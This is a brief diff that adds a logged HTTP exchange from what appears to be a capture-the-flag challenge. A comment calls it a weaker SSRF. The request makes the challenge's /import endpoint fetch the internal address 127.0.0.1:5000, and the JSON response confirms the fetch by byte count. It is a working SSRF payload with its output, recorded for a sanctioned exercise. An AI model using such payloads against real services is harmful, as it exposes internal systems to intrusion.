@@ -1,0 +1,14 @@
+# the weaker /import SSRF: returns byte count only, no body
+GET http://meshgate-f1a5eea8fd01ddea.challs.ctf.thefewchosen.com/import?url=http%3A%2F%2F127.0.0.1%3A5000%2F
+HTTP 200
+Content-Length: 62
+Content-Type: application/json
+Date: Sun, 06 Sep 2026 13:21:08 GMT
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+Referrer-Policy: no-referrer
+Server: nginx
+Vary: Cookie
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+
+{"bytes":256,"fetched":"http://127.0.0.1:5000/","status":200}
